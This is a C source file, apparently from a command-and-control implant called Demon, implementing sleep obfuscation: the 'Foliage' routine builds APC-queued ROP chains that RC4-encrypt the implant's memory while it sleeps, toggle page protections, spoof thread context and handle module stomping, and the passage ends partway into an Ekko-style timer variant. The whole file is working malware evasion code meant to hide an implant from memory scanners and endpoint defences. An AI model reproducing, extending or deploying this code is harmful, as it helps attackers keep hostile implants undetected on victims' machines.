#include <Demon.h>

#include <Common/Macros.h>
#include <Core/SleepObf.h>
#include <Core/Win32.h>
#include <Core/MiniStd.h>
#include <Core/Thread.h>

#include <rpcndr.h>
#include <ntstatus.h>


#if _WIN64

#define STACKCONST 0x1000

typedef struct _SLEEP_PARAM
{
    UINT32  TimeOut;
    PVOID   Master;
    PVOID   Slave;
} SLEEP_PARAM, *PSLEEP_PARAM ;

/*!
 * @brief
 *  foliage is a sleep obfuscation technique that is using APC calls
 *  to obfuscate itself in memory
 *
 * @param Param
 * @return
 */
VOID FoliageObf(
    IN PSLEEP_PARAM Param
) {
    USTRING             Key         = { 0 };
    USTRING             Rc4         = { 0 };
    USTRING             KeyStomped  = { 0 };
    USTRING             Rc4Stomped  = { 0 };
    UCHAR               Random[16]  = { 0 };

    HANDLE              hEvent      = NULL;
    HANDLE              hThread     = NULL;
    HANDLE              hDupObj     = NULL;

    PIMAGE_NT_HEADERS       NtHeaders       = NULL;
    PIMAGE_SECTION_HEADER   SecHeader       = NULL;


    // Rop Chain Thread Ctx
    PCONTEXT            RopInit     = { 0 };
    PCONTEXT            RopCap      = { 0 };
    PCONTEXT            RopSpoof    = { 0 };

    PCONTEXT            RopBegin    = { 0 };
    PCONTEXT            RopSetMemRw = { 0 };
    PCONTEXT            RopCopyStomped = {0};
    PCONTEXT            RopMemEnc   = { 0 };
    PCONTEXT            RopSetMemRx = { 0 };
    PCONTEXT            RopGetCtx   = { 0 };
    PCONTEXT            RopSetCtx   = { 0 };
    PCONTEXT            RopWaitObj  = { 0 };
    PCONTEXT            RopResetMemRw = { 0 };
    PCONTEXT            RopMemDec   = { 0 };
    PCONTEXT            RopCopyPayload = {0};
    PCONTEXT            RopResetMemRx = { 0 };
    PCONTEXT            RopSetCtx2  = { 0 };
    PCONTEXT            RopExitThd  = { 0 };

    //Rop memory protections
    PCONTEXT            RopMemProtect = {0};

    SIZE_T PEHeaderSize = 0;
    DWORD Cnt = 60;
    PPAGEPROTECT_PARAM PageProtectParams = {0};
    DWORD NumberOfSections = 0;
    LPVOID              ImageBase,ImageBase1,ImageBase2,ImageBase3   = NULL;
    SIZE_T              ImageSize,ImageSize1, ImageSize2, ImageSize3   = 0;
    LPVOID              TxtBase     = NULL;
    SIZE_T              TxtSize     = 0;
    DWORD               dwProtect   = PAGE_EXECUTE_READWRITE;
    SIZE_T              TmpValue    = 0;
    SIZE_T StompedLength1, StompedLength2, StompedLength3 = 0;
    ImageBase = ImageBase1 = ImageBase2 = ImageBase3 = Instance.Session.ModuleBase;
    ImageSize = ImageSize1 = ImageSize2 = ImageSize3 = Instance.Session.ModuleSize;
//
//    // Check if .text section is defined
//    if (Instance.Session.TxtBase != 0 && Instance.Session.TxtSize != 0) {
//        TxtBase = Instance.Session.TxtBase;
//        TxtSize = Instance.Session.TxtSize;
//        dwProtect  = PAGE_EXECUTE_READ;
//    } else {
//        TxtBase = Instance.Session.ModuleBase;
//        TxtSize = Instance.Session.ModuleSize;
//    }

    // Generate random keys
    for ( SHORT i = 0; i < 16; i++ )
        Random[ i ] = RandomNumber32( );

    NumberOfSections = Instance.Session.NumberOfSections;
    //if module stomping is enabled
    if(Instance.Session.Rc4StompedModule.Buffer != NULL) {
        //Copying payload to other location
        MemCopy(Instance.Session.Rc4PayloadModule.Buffer, ImageBase, ImageSize);
        //generating random key
        for (SHORT i = 0; i < KEYSIZE; i++)
            ((PBYTE) (Instance.Session.KeyPayloadModule.Buffer))[i] = RandomNumber32();
        //encrypting copy of payload
        Instance.Win32.SystemFunction032(&(Instance.Session.Rc4PayloadModule), &(Instance.Session.KeyPayloadModule));

        //storing encrypted payload info in stack
        Key.Buffer = Instance.Session.KeyPayloadModule.Buffer;
        Key.Length = Key.MaximumLength = Instance.Session.KeyPayloadModule.Length;

        Rc4.Buffer = Instance.Session.Rc4PayloadModule.Buffer;
        Rc4.Length = Rc4.MaximumLength = Instance.Session.Rc4PayloadModule.Length;


        //Decrypting stomped module
        Instance.Win32.SystemFunction032(&(Instance.Session.Rc4StompedModule),&(Instance.Session.KeyStompedModule));

        //saving stomped module info in stack
        Rc4Stomped.Buffer = Instance.Session.Rc4StompedModule.Buffer;
        Rc4Stomped.Length = Instance.Session.Rc4StompedModule.Length;
        Rc4Stomped.MaximumLength = Instance.Session.Rc4StompedModule.MaximumLength;

        KeyStomped.Buffer = Instance.Session.KeyStompedModule.Buffer;
        KeyStomped.Length = Instance.Session.KeyStompedModule.Length;
        KeyStomped.MaximumLength = Instance.Session.KeyStompedModule.MaximumLength;

        StompedLength1 = StompedLength2  = StompedLength3 = Instance.Session.Rc4StompedModule.Length;
    }
    else{
        Key.Buffer = Random;
        Key.Length = Key.MaximumLength = 16;
        Rc4.Buffer = ImageBase;
        Rc4.Length = Rc4.MaximumLength = ImageSize;
    }
    if ( NT_SUCCESS( SysNtCreateEvent( &hEvent, EVENT_ALL_ACCESS, NULL, SynchronizationEvent, FALSE ) ) )
    {
        if ( NT_SUCCESS( SysNtCreateThreadEx( &hThread, THREAD_ALL_ACCESS, NULL, NtCurrentProcess(), Instance.Config.Implant.ThreadStartAddr, NULL, TRUE, 0, STACKCONST * (Cnt+5), STACKCONST * (Cnt+5), NULL ) ) )
        {
            RopInit     = Instance.Win32.LocalAlloc( LPTR, sizeof( CONTEXT ) );
            RopCap      = Instance.Win32.LocalAlloc( LPTR, sizeof( CONTEXT ) );
            RopSpoof    = Instance.Win32.LocalAlloc( LPTR, sizeof( CONTEXT ) );

            RopBegin    = Instance.Win32.LocalAlloc( LPTR, sizeof( CONTEXT ) );
            RopCopyStomped = Instance.Win32.LocalAlloc( LPTR, sizeof( CONTEXT ) );
            RopSetMemRw = Instance.Win32.LocalAlloc( LPTR, sizeof( CONTEXT ) );
            RopMemEnc   = Instance.Win32.LocalAlloc( LPTR, sizeof( CONTEXT ) );
            RopGetCtx   = Instance.Win32.LocalAlloc( LPTR, sizeof( CONTEXT ) );
            RopSetCtx   = Instance.Win32.LocalAlloc( LPTR, sizeof( CONTEXT ) );
            RopWaitObj  = Instance.Win32.LocalAlloc( LPTR, sizeof( CONTEXT ) );
            RopResetMemRw = Instance.Win32.LocalAlloc( LPTR, sizeof( CONTEXT ) );
            RopMemDec   = Instance.Win32.LocalAlloc( LPTR, sizeof( CONTEXT ) );
            RopCopyPayload = Instance.Win32.LocalAlloc( LPTR, sizeof( CONTEXT ) );
            RopSetMemRx = Instance.Win32.LocalAlloc( LPTR, sizeof( CONTEXT ) );
            RopSetCtx2  = Instance.Win32.LocalAlloc( LPTR, sizeof( CONTEXT ) );
            RopExitThd  = Instance.Win32.LocalAlloc( LPTR, sizeof( CONTEXT ) );

            //Rop for page protections
            RopMemProtect = Instance.Win32.LocalAlloc( LPTR, sizeof( CONTEXT )*Instance.Session.NumberOfSections );
            //params for each rop page protection
            PageProtectParams = Instance.Win32.LocalAlloc( LPTR, sizeof( PAGEPROTECT_PARAM )*Instance.Session.NumberOfSections );

            RopInit->ContextFlags       = CONTEXT_FULL;
            RopCap->ContextFlags        = CONTEXT_FULL;
            RopSpoof->ContextFlags      = CONTEXT_FULL;

            RopBegin->ContextFlags      = CONTEXT_FULL;
            RopSetMemRw->ContextFlags   = CONTEXT_FULL;
            RopCopyStomped->ContextFlags= CONTEXT_FULL;
            RopSetMemRx->ContextFlags   = CONTEXT_FULL;
            RopMemEnc->ContextFlags     = CONTEXT_FULL;
            RopGetCtx->ContextFlags     = CONTEXT_FULL;
            RopSetCtx->ContextFlags     = CONTEXT_FULL;
            RopWaitObj->ContextFlags    = CONTEXT_FULL;
            RopResetMemRw->ContextFlags = CONTEXT_FULL;
            RopCopyPayload->ContextFlags= CONTEXT_FULL;
            RopMemDec->ContextFlags     = CONTEXT_FULL;
            RopSetMemRx->ContextFlags   = CONTEXT_FULL;
            RopSetCtx2->ContextFlags    = CONTEXT_FULL;
            RopExitThd->ContextFlags    = CONTEXT_FULL;

            for(int i=0;i<NumberOfSections;i++){
                RopMemProtect[i].ContextFlags = CONTEXT_FULL;
            }

            if ( NT_SUCCESS( SysNtDuplicateObject( NtCurrentProcess(), NtCurrentThread(), NtCurrentProcess(), &hDupObj, THREAD_ALL_ACCESS, 0, 0 ) ) ) {
                if (NT_SUCCESS(Instance.Win32.NtGetContextThread(hThread, RopInit))) {
                    MemCopy(RopBegin, RopInit, sizeof(CONTEXT));
                    MemCopy(RopSetMemRw, RopInit, sizeof(CONTEXT));
                    MemCopy(RopCopyStomped, RopInit, sizeof(CONTEXT));
                    MemCopy(RopMemEnc, RopInit, sizeof(CONTEXT));
                    MemCopy(RopSetMemRx, RopInit, sizeof(CONTEXT));
                    MemCopy(RopGetCtx, RopInit, sizeof(CONTEXT));
                    MemCopy(RopSetCtx, RopInit, sizeof(CONTEXT));
                    MemCopy(RopWaitObj, RopInit, sizeof(CONTEXT));
                    MemCopy(RopResetMemRw, RopInit, sizeof(CONTEXT));
                    MemCopy(RopMemDec, RopInit, sizeof(CONTEXT));
                    MemCopy(RopCopyPayload, RopInit, sizeof(CONTEXT));
                    MemCopy(RopSetCtx2, RopInit, sizeof(CONTEXT));
                    MemCopy(RopExitThd, RopInit, sizeof(CONTEXT));

                    for (int i = 0; i < NumberOfSections; i++) {
                        MemCopy(&(RopMemProtect[i]), RopInit, sizeof(CONTEXT));
                    }

                    RopBegin->ContextFlags = CONTEXT_FULL;
                    RopBegin->Rip = U_PTR(Instance.Win32.NtWaitForSingleObject);
                    RopBegin->Rsp -= U_PTR(STACKCONST * Cnt);
                    RopBegin->Rcx = U_PTR(hEvent);
                    RopBegin->Rdx = U_PTR(FALSE);
                    RopBegin->R8 = U_PTR(NULL);
                    *(PVOID *) (RopBegin->Rsp + (sizeof(ULONG_PTR) * 0x0)) = C_PTR(Instance.Win32.NtTestAlert);
                    Cnt--;
                    // NtWaitForSingleObject( Evt, FALSE, NULL )

                    RopSetMemRw->ContextFlags = CONTEXT_FULL;
                    RopSetMemRw->Rip = U_PTR(Instance.Win32.NtProtectVirtualMemory);
                    RopSetMemRw->Rsp -= U_PTR(STACKCONST * Cnt);
                    RopSetMemRw->Rcx = U_PTR(NtCurrentProcess());
                    RopSetMemRw->Rdx = U_PTR(&ImageBase1);
                    RopSetMemRw->R8 = U_PTR((SIZE_T *) &(StompedLength1));
                    RopSetMemRw->R9 = U_PTR(PAGE_READWRITE);
                    *(PVOID *) (RopSetMemRw->Rsp + (sizeof(ULONG_PTR) * 0x0)) = C_PTR(Instance.Win32.NtTestAlert);
                    *(PVOID *) (RopSetMemRw->Rsp + (sizeof(ULONG_PTR) * 0x5)) = C_PTR(&TmpValue);
                    Cnt--;
                    // NtProtectVirtualMemory( NtCurrentProcess(), &Img, &Len, PAGE_READWRITE, NULL,  );

                    if (Instance.Session.Rc4StompedModule.Buffer != NULL) {
                        //Copy Stomped Module
                        RopCopyStomped->ContextFlags = CONTEXT_FULL;
                        RopCopyStomped->Rip = U_PTR(Instance.Win32.RtlCopyMappedMemory);
                        RopCopyStomped->Rsp -= U_PTR(STACKCONST * Cnt);
                        RopCopyStomped->Rcx = U_PTR(ImageBase);
                        RopCopyStomped->Rdx = U_PTR(Rc4Stomped.Buffer);
                        RopCopyStomped->R8 = (SIZE_T) (Rc4Stomped.Length);
                        *(PVOID *) (RopCopyStomped->Rsp + (sizeof(ULONG_PTR) * 0x0)) = C_PTR(
                                Instance.Win32.NtTestAlert);
                        Cnt--;
                        //Encrypt the copy of stomped module
                        RopMemEnc->ContextFlags = CONTEXT_FULL;
                        RopMemEnc->Rip = U_PTR(Instance.Win32.SystemFunction032);
                        RopMemEnc->Rsp -= U_PTR(STACKCONST * Cnt);
                        RopMemEnc->Rcx = U_PTR(&(Rc4Stomped));
                        RopMemEnc->Rdx = U_PTR(&(KeyStomped));
                        *(PVOID *) (RopMemEnc->Rsp + (sizeof(ULONG_PTR) * 0x0)) = C_PTR(Instance.Win32.NtTestAlert);
                        Cnt--;
                        //Reset PAGE READ_EXECUTE
                        // RW -> RX
                        RopSetMemRx->ContextFlags = CONTEXT_FULL;
                        RopSetMemRx->Rip = U_PTR(Instance.Win32.NtProtectVirtualMemory);
                        RopSetMemRx->Rsp -= U_PTR(STACKCONST * Cnt);
                        RopSetMemRx->Rcx = U_PTR(NtCurrentProcess());
                        RopSetMemRx->Rdx = U_PTR(&ImageBase2);
                        RopSetMemRx->R8 = U_PTR(&(StompedLength2));
                        RopSetMemRx->R9 = U_PTR(PAGE_EXECUTE_READ);
                        *(PVOID *) (RopSetMemRx->Rsp + (sizeof(ULONG_PTR) * 0x0)) = C_PTR(Instance.Win32.NtTestAlert);
                        *(PVOID *) (RopSetMemRx->Rsp + (sizeof(ULONG_PTR) * 0x5)) = C_PTR(&TmpValue);
                        // NtProtectVirtualMemory( NtCurrentProcess(), &Img, &Len, PAGE_EXECUTE_READ, & TmpValue );
                        Cnt--;
                    } else {
                        RopMemEnc->ContextFlags = CONTEXT_FULL;
                        RopMemEnc->Rip = U_PTR(Instance.Win32.SystemFunction032);
                        RopMemEnc->Rsp -= U_PTR(STACKCONST * Cnt);
                        RopMemEnc->Rcx = U_PTR(&Rc4);
                        RopMemEnc->Rdx = U_PTR(&Key);
                        *(PVOID *) (RopMemEnc->Rsp + (sizeof(ULONG_PTR) * 0x0)) = C_PTR(Instance.Win32.NtTestAlert);
                        // SystemFunction032( &Rc4, &Key ); RC4 Encryption
                        Cnt--;
                    }
                    RopGetCtx->ContextFlags = CONTEXT_FULL;
                    RopGetCtx->Rip = U_PTR(Instance.Win32.NtGetContextThread);
                    RopGetCtx->Rsp -= U_PTR(STACKCONST * Cnt);
                    RopGetCtx->Rcx = U_PTR(hDupObj);
                    RopGetCtx->Rdx = U_PTR(RopCap);
                    *(PVOID *) (RopGetCtx->Rsp + (sizeof(ULONG_PTR) * 0x0)) = C_PTR(Instance.Win32.NtTestAlert);
                    // NtGetContextThread( Src, Cap );
                    Cnt--;

                    RopSetCtx->ContextFlags = CONTEXT_FULL;
                    RopSetCtx->Rip = U_PTR(Instance.Win32.NtSetContextThread);
                    RopSetCtx->Rsp -= U_PTR(STACKCONST * Cnt);
                    RopSetCtx->Rcx = U_PTR(hDupObj);
                    RopSetCtx->Rdx = U_PTR(RopSpoof);
                    *(PVOID *) (RopSetCtx->Rsp + (sizeof(ULONG_PTR) * 0x0)) = C_PTR(Instance.Win32.NtTestAlert);
                    // NtSetContextThread( Src, Spf );
                    Cnt--;
                    // NOTE: Here is the thread sleeping...
                    RopWaitObj->ContextFlags = CONTEXT_FULL;
                    RopWaitObj->Rip = U_PTR(Instance.Win32.WaitForSingleObjectEx);
                    RopWaitObj->Rsp -= U_PTR(STACKCONST * Cnt);
                    RopWaitObj->Rcx = U_PTR(hDupObj);
                    RopWaitObj->Rdx = U_PTR(Param->TimeOut);
                    RopWaitObj->R8 = U_PTR(FALSE);
                    *(PVOID *) (RopWaitObj->Rsp + (sizeof(ULONG_PTR) * 0x0)) = C_PTR(Instance.Win32.NtTestAlert);
                    // WaitForSingleObjectEx( Src, Fbr->Time, FALSE );
                    Cnt--;

                    // NOTE: thread image decryption
                    if (Instance.Session.Rc4StompedModule.Buffer != NULL) {
                        // Reset RX to RW
                        RopResetMemRw->ContextFlags = CONTEXT_FULL;
                        RopResetMemRw->Rip = U_PTR(Instance.Win32.NtProtectVirtualMemory);
                        RopResetMemRw->Rsp -= U_PTR(STACKCONST * Cnt);
                        RopResetMemRw->Rcx = U_PTR(NtCurrentProcess());
                        RopResetMemRw->Rdx = U_PTR(&ImageBase3);
                        RopResetMemRw->R8 = U_PTR((SIZE_T *) &(StompedLength3));
                        RopResetMemRw->R9 = U_PTR(PAGE_READWRITE);
                        *(PVOID *) (RopResetMemRw->Rsp + (sizeof(ULONG_PTR) * 0x0)) = C_PTR(Instance.Win32.NtTestAlert);
                        *(PVOID *) (RopResetMemRw->Rsp + (sizeof(ULONG_PTR) * 0x5)) = C_PTR(&TmpValue);
                        // NtProtectVirtualMemory( NtCurrentProcess(), &Img, &Len, PAGE_READWRITE, NULL,  );
                        Cnt--;
                        //Decrypt payload
                        RopMemDec->ContextFlags = CONTEXT_FULL;
                        RopMemDec->Rip = U_PTR(Instance.Win32.SystemFunction032);
                        RopMemDec->Rsp -= U_PTR(STACKCONST * Cnt);
                        RopMemDec->Rcx = U_PTR(&Rc4);
                        RopMemDec->Rdx = U_PTR(&Key);
                        *(PVOID *) (RopMemDec->Rsp + (sizeof(ULONG_PTR) * 0x0)) = C_PTR(Instance.Win32.NtTestAlert);
                        // SystemFunction032( &Rc4, &Key ); Rc4 Decryption
                        Cnt--;
                        //Copy payload back to original position
                        RopCopyPayload->ContextFlags = CONTEXT_FULL;
                        RopCopyPayload->Rip = U_PTR(Instance.Win32.RtlCopyMappedMemory);
                        RopCopyPayload->Rsp -= U_PTR(STACKCONST * Cnt);
                        RopCopyPayload->Rcx = U_PTR(ImageBase);
                        RopCopyPayload->Rdx = U_PTR(Rc4.Buffer);
                        RopCopyPayload->R8 = (SIZE_T) (Rc4.Length);
                        *(PVOID *) (RopCopyPayload->Rsp + (sizeof(ULONG_PTR) * 0x0)) = C_PTR(
                                Instance.Win32.NtTestAlert);
                        Cnt--;
                    } else {
                        RopMemDec->ContextFlags = CONTEXT_FULL;
                        RopMemDec->Rip = U_PTR(Instance.Win32.SystemFunction032);
                        RopMemDec->Rsp -= U_PTR(STACKCONST * Cnt);
                        RopMemDec->Rcx = U_PTR(&Rc4);
                        RopMemDec->Rdx = U_PTR(&Key);
                        *(PVOID *) (RopMemDec->Rsp + (sizeof(ULONG_PTR) * 0x0)) = C_PTR(Instance.Win32.NtTestAlert);
                        // SystemFunction032( &Rc4, &Key ); Rc4 Decryption
                        Cnt--;
                    }
                    //Reset original payload page protections. Instead of setting RWX on all of them, set the proper page permissions
                    for (int i = 0; i < Instance.Session.NumberOfSections; i++) {
                        RopMemProtect[i].ContextFlags = CONTEXT_FULL;
                        RopMemProtect[i].Rip = U_PTR(Instance.Win32.NtProtectVirtualMemory);
                        RopMemProtect[i].Rsp -= U_PTR(STACKCONST * Cnt);
                        RopMemProtect[i].Rcx = U_PTR(NtCurrentProcess());
                        RopMemProtect[i].Rdx = U_PTR(&(Instance.Session.PageProtectParams[i].SecMemory));
                        RopMemProtect[i].R8 = U_PTR(&(Instance.Session.PageProtectParams[i].SecMemorySize));
                        RopMemProtect[i].R9 = U_PTR(Instance.Session.PageProtectParams[i].Protection);
                        *(PVOID *) (RopMemProtect[i].Rsp + (sizeof(ULONG_PTR) * 0x0)) = C_PTR(
                                Instance.Win32.NtTestAlert);
                        *(PVOID *) (RopMemProtect[i].Rsp + (sizeof(ULONG_PTR) * 0x5)) = C_PTR(&TmpValue);
                        // NtProtectVirtualMemory( NtCurrentProcess(), &Img, &Len, PAGE_READWRITE, NULL,  );
                        Cnt--;
                    }
                    RopSetCtx2->ContextFlags = CONTEXT_FULL;
                    RopSetCtx2->Rip = U_PTR(Instance.Win32.NtSetContextThread);
                    RopSetCtx2->Rsp -= U_PTR(STACKCONST * Cnt);
                    RopSetCtx2->Rcx = U_PTR(hDupObj);
                    RopSetCtx2->Rdx = U_PTR(RopCap);
                    *(PVOID *) (RopSetCtx2->Rsp + (sizeof(ULONG_PTR) * 0x0)) = C_PTR(Instance.Win32.NtTestAlert);
                    // NtSetContextThread( Src, Cap );
                    Cnt--;

                    RopExitThd->ContextFlags = CONTEXT_FULL;
                    RopExitThd->Rip = U_PTR(Instance.Win32.RtlExitUserThread);
                    RopExitThd->Rsp -= U_PTR(STACKCONST * Cnt);
                    RopExitThd->Rcx = U_PTR(ERROR_SUCCESS);
                    *(PVOID *) (RopExitThd->Rsp + (sizeof(ULONG_PTR) * 0x0)) = C_PTR(Instance.Win32.NtTestAlert);
                    // RtlExitUserThread( ERROR_SUCCESS );
                    Cnt--;

                    //If no module stomping perform usual sleep obfuscation
                    if (Instance.Session.Rc4StompedModule.Buffer == NULL) {
                        if (!NT_SUCCESS(
                                SysNtQueueApcThread(hThread, C_PTR(Instance.Win32.NtContinue), RopBegin, FALSE, NULL)))
                            goto Leave;
                        if (!NT_SUCCESS(
                                SysNtQueueApcThread(hThread, C_PTR(Instance.Win32.NtContinue), RopSetMemRw, FALSE,
                                                    NULL)))
                            goto Leave;
                        if (!NT_SUCCESS(
                                SysNtQueueApcThread(hThread, C_PTR(Instance.Win32.NtContinue), RopMemEnc, FALSE, NULL)))
                            goto Leave;
                        if (!NT_SUCCESS(
                                SysNtQueueApcThread(hThread, C_PTR(Instance.Win32.NtContinue), RopGetCtx, FALSE, NULL)))
                            goto Leave;
                        if (!NT_SUCCESS(
                                SysNtQueueApcThread(hThread, C_PTR(Instance.Win32.NtContinue), RopSetCtx, FALSE, NULL)))
                            goto Leave;
                        if (!NT_SUCCESS(
                                SysNtQueueApcThread(hThread, C_PTR(Instance.Win32.NtContinue), RopWaitObj, FALSE,
                                                    NULL)))
                            goto Leave;
                        if (!NT_SUCCESS(
                                SysNtQueueApcThread(hThread, C_PTR(Instance.Win32.NtContinue), RopMemDec, FALSE, NULL)))
                            goto Leave;
                        for (int i = 0; i < NumberOfSections; i++) {
                            if (!NT_SUCCESS(
                                    SysNtQueueApcThread(hThread, C_PTR(Instance.Win32.NtContinue), &(RopMemProtect[i]),
                                                        FALSE, NULL)))
                                goto Leave;
                        }
                        if (!NT_SUCCESS(
                                SysNtQueueApcThread(hThread, C_PTR(Instance.Win32.NtContinue), RopSetCtx2, FALSE,
                                                    NULL)))
                            goto Leave;
                        if (!NT_SUCCESS(
                                SysNtQueueApcThread(hThread, C_PTR(Instance.Win32.NtContinue), RopExitThd, FALSE,
                                                    NULL)))
                            goto Leave;
                    }
                        //otherwise use different sleep obfuscation
                    else {
                        if (!NT_SUCCESS(
                                SysNtQueueApcThread(hThread, C_PTR(Instance.Win32.NtContinue), RopBegin, FALSE, NULL)))
                            goto Leave;
                        if (!NT_SUCCESS(
                                SysNtQueueApcThread(hThread, C_PTR(Instance.Win32.NtContinue), RopSetMemRw, FALSE,
                                                    NULL)))
                            goto Leave;
                        if (!NT_SUCCESS(
                                SysNtQueueApcThread(hThread, C_PTR(Instance.Win32.NtContinue), RopCopyStomped, FALSE,
                                                    NULL)))
                            goto Leave;
                        if (!NT_SUCCESS(
                                SysNtQueueApcThread(hThread, C_PTR(Instance.Win32.NtContinue), RopSetMemRx, FALSE,
                                                    NULL)))
                            goto Leave;
                        if (!NT_SUCCESS(
                                SysNtQueueApcThread(hThread, C_PTR(Instance.Win32.NtContinue), RopGetCtx, FALSE, NULL)))
                            goto Leave;
                        if (!NT_SUCCESS(
                                SysNtQueueApcThread(hThread, C_PTR(Instance.Win32.NtContinue), RopSetCtx, FALSE, NULL)))
                            goto Leave;
                        if (!NT_SUCCESS(
                                SysNtQueueApcThread(hThread, C_PTR(Instance.Win32.NtContinue), RopWaitObj, FALSE,
                                                    NULL)))
                            goto Leave;
                        if (!NT_SUCCESS(
                                SysNtQueueApcThread(hThread, C_PTR(Instance.Win32.NtContinue), RopResetMemRw, FALSE,
                                                    NULL)))
                            goto Leave;
                        if (!NT_SUCCESS(
                                SysNtQueueApcThread(hThread, C_PTR(Instance.Win32.NtContinue), RopMemDec, FALSE, NULL)))
                            goto Leave;
                        if (!NT_SUCCESS(
                                SysNtQueueApcThread(hThread, C_PTR(Instance.Win32.NtContinue), RopCopyPayload, FALSE,
                                                    NULL)))
                            goto Leave;
                        for (int i = 0; i < NumberOfSections; i++) {
                            if (!NT_SUCCESS(
                                    SysNtQueueApcThread(hThread, C_PTR(Instance.Win32.NtContinue), &(RopMemProtect[i]),
                                                        FALSE, NULL)))
                                goto Leave;
                        }
                        if (!NT_SUCCESS(
                                SysNtQueueApcThread(hThread, C_PTR(Instance.Win32.NtContinue), RopSetCtx2, FALSE,
                                                    NULL)))
                            goto Leave;
                        if (!NT_SUCCESS(
                                SysNtQueueApcThread(hThread, C_PTR(Instance.Win32.NtContinue), RopExitThd, FALSE,
                                                    NULL)))
                            goto Leave;
                    }
                    if (NT_SUCCESS(SysNtAlertResumeThread(hThread, NULL))) {
                        RopSpoof->ContextFlags = CONTEXT_FULL;
                        RopSpoof->Rip = U_PTR(Instance.Win32.WaitForSingleObjectEx);
                        RopSpoof->Rsp = U_PTR(
                                Instance.Teb->NtTib.StackBase); // TODO: try to spoof the stack and remove the pointers

                        // Execute every registered Apc thread
                        SysNtSignalAndWaitForSingleObject(hEvent, hThread, FALSE, NULL);
                    }
                }
            }
        }
    }

Leave:
    if (RopResetMemRw != NULL){
        Instance.Win32.LocalFree(RopResetMemRw);
        RopResetMemRw = NULL;
    }
    if (RopResetMemRx != NULL){
        Instance.Win32.LocalFree(RopResetMemRx);
        RopResetMemRx = NULL;
    }
    if (RopCopyStomped != NULL){
        Instance.Win32.LocalFree(RopCopyStomped);
        RopCopyStomped = NULL;
    }
    if (RopCopyPayload != NULL){
        Instance.Win32.LocalFree(RopCopyPayload);
        RopCopyPayload = NULL;
    }
    if (RopCopyPayload != NULL){
        Instance.Win32.LocalFree(RopCopyPayload);
        RopCopyPayload = NULL;
    }
    if(RopMemProtect != NULL){
        Instance.Win32.LocalFree(RopMemProtect);
        RopMemProtect = NULL;
    }
    if ( RopExitThd != NULL ) {
        Instance.Win32.LocalFree( RopExitThd );
        RopExitThd = NULL;
    }

    if ( RopSetCtx2 != NULL ) {
        Instance.Win32.LocalFree( RopSetCtx2 );
        RopSetCtx2 = NULL;
    }

    if ( RopSetMemRx != NULL ) {
        Instance.Win32.LocalFree( RopSetMemRx );
        RopSetMemRx = NULL;
    }

    if ( RopMemDec != NULL ) {
        Instance.Win32.LocalFree( RopMemDec );
        RopMemDec = NULL;
    }

    if ( RopWaitObj != NULL ) {
        Instance.Win32.LocalFree( RopWaitObj );
        RopWaitObj = NULL;
    }

    if ( RopSetCtx != NULL ) {
        Instance.Win32.LocalFree( RopSetCtx );
        RopSetCtx = NULL;
    }

    if ( RopSetMemRw != NULL ) {
        Instance.Win32.LocalFree( RopSetMemRw );
        RopSetMemRw = NULL;
    }

    if ( RopBegin != NULL ) {
        Instance.Win32.LocalFree( RopBegin );
        RopBegin = NULL;
    }

    if ( RopSpoof != NULL ) {
        Instance.Win32.LocalFree( RopSpoof );
        RopSpoof = NULL;
    }

    if ( RopCap != NULL ) {
        Instance.Win32.LocalFree( RopCap );
        RopCap = NULL;
    }

    if ( RopInit != NULL ) {
        Instance.Win32.LocalFree( RopInit );
        RopInit = NULL;
    }

    if ( hDupObj != NULL ) {
        SysNtClose( hDupObj );
        hDupObj = NULL;
    }

    if ( hThread != NULL ) {
        SysNtTerminateThread( hThread, STATUS_SUCCESS );
        hThread = NULL;
    }

    if ( hEvent != NULL ) {
        SysNtClose( hEvent );
        hEvent = NULL;
    }

    if ( Instance.Session.Rc4PayloadModule.Buffer != NULL){
        RtlSecureZeroMemory(Instance.Session.Rc4PayloadModule.Buffer,(SIZE_T)Instance.Session.Rc4PayloadModule.Length);
    }
    MemSet( &Rc4, 0, sizeof( USTRING ) );
    MemSet( &Key, 0, sizeof( USTRING ) );
    MemSet( &Random, 0, 0x10 );

    Instance.Win32.SwitchToFiber( Param->Master );
}

/*!
 * @brief
 *  ekko/zilean sleep obfuscation technique using
 *  Timers Api (RtlCreateTimer/RtlRegisterWait)
 *  with stack duplication/spoofing by duplicating the
 *  NT_TIB from another thread.
 *
 * @note
 *  this technique most likely wont work when the
 *  process is also actively using the timers api.
 *  So in future either use Veh + hardware breakpoints
 *  to create our own thread pool or leave it as it is.
 *
 * @param TimeOut
 * @param Method
 * @return
 */
BOOL TimerObf(
    IN DWORD TimeOut,
    IN DWORD Method
) {
    /* Handles */
    HANDLE  Queue     = NULL;
    HANDLE  Timer     = NULL;
    HANDLE  ThdSrc    = NULL;
    HANDLE  EvntStart = NULL;
    HANDLE  EvntTimer = NULL;
    HANDLE  EvntDelay = NULL;
    HANDLE  EvntWait  = NULL;

    /* buffer/pointer holders */
    UCHAR   Buf[ 16 ] = { 0 };
    USTRING Key       = { 0 };
    USTRING Img       = { 0 };
    USTRING KeyStomped  = { 0 };
    USTRING Rc4Stomped  = { 0 };
    PVOID   ImageBase   = { 0 };
    SIZE_T   ImageSize   = { 0 };
    /* rop/thread contexts */
    CONTEXT TimerCtx  = { 0 };
    CONTEXT ThdCtx    = { 0 };
    PCONTEXT Rop = NULL;
    //CONTEXT Rop[ 50 ] = { { 0 } };

    /* some vars */
    DWORD    Value     = 0;
    DWORD    Delay     = 0;
    BOOL     Success   = FALSE;
    NT_TIB   NtTib     = { 0 };
    NT_TIB   BkpTib    = { 0 };
    NTSTATUS NtStatus  = STATUS_SUCCESS;
    DWORD    Inc       = 0;
    PIMAGE_NT_HEADERS       NtHeaders       = NULL;
    PIMAGE_SECTION_HEADER   SecHeader       = NULL;
    DWORD NumberOfSections = 0;
    PPAGEPROTECT_PARAM PageProtectParams = {0};

    LPVOID              TxtBase     = NULL;
    SIZE_T              TxtSize     = 0;
    DWORD               dwProtect   = PAGE_EXECUTE_READWRITE;

    PUTS( "Starting EKKO Sleep Obf" );
    ImageBase = Instance.Session.ModuleBase;
    ImageSize = Instance.Session.ModuleSize;

    Rop = Instance.Win32.LocalAlloc( LPTR, sizeof( CONTEXT )*50 );
    PageProtectParams = Instance.Win32.LocalAlloc( LPTR, sizeof( PAGEPROTECT_PARAM )*Instance.Session.NumberOfSections );

    // Check if .text section is defined
//    if (Instance.Session.TxtBase != 0 && Instance.Session.TxtSize != 0) {
//        TxtBase = Instance.Session.TxtBase;
//        TxtSize = Instance.Session.TxtSize;
//        dwProtect  = PAGE_EXECUTE_READ;
//    } else {
//        TxtBase = Instance.Session.ModuleBase;
//        TxtSize = Instance.Session.ModuleSize;
//    }

